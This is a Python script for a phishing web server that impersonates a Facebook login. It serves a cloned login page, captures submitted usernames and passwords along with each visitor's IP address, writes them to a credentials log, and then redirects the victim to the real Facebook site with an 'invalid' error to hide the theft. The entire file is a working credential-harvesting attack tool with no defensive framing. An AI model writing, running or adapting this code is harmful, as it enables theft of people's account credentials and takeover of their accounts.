import http.server
import socketserver
import urllib.parse
import ssl
import logging
import os

# Config
PORT = 8080
LOG_FILE = "creds.log"
HTML_FILE = "facebook_login.html"
USE_SSL = False
CERT_FILE = "server.crt"
KEY_FILE = "server.key"

logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format="%(asctime)s - %(message)s")

class PhishHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        if os.path.exists(HTML_FILE):
            with open(HTML_FILE, "rb") as f:
                self.wfile.write(f.read())
        else:
            self.wfile.write(b"Error: Login page not found")

    def do_POST(self):
        content_length = int(self.headers["Content-Length"])
        post_data = self.rfile.read(content_length).decode()
        params = urllib.parse.parse_qs(post_data)
        
        username = params.get("username", [""])[0]
        password = params.get("password", [""])[0]
        
        log_msg = f"Caught: username={username}, password={password}, IP={self.client_address[0]}"
        logging.info(log_msg)
        print(log_msg)
        
        self.send_response(302)
        self.send_header("Location", "https://www.facebook.com/login/?error=invalid")
        self.end_headers()

    def log_message(self, format, *args):
        pass

# Start server
def run_server():
    httpd = socketserver.TCPServer(("", PORT), PhishHandler)
    
    if USE_SSL:
        httpd.socket = ssl.wrap_socket(httpd.socket, certfile=CERT_FILE, keyfile=KEY_FILE, server_side=True)
        proto = "HTTPS"
    else:
        proto = "HTTP"
    
    print(f"[+] {proto} Phishing Server running on port {PORT}")
    print(f"[+] Serving {HTML_FILE}")
    print(f"[+] Logs saved to {LOG_FILE}")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[-] Shutting down...")
        httpd.server_close()

if __name__ == "__main__":
    if not os.path.exists(HTML_FILE):
        print(f"[-] Error: {HTML_FILE} not found—create it first!")
    else:
        run_server()
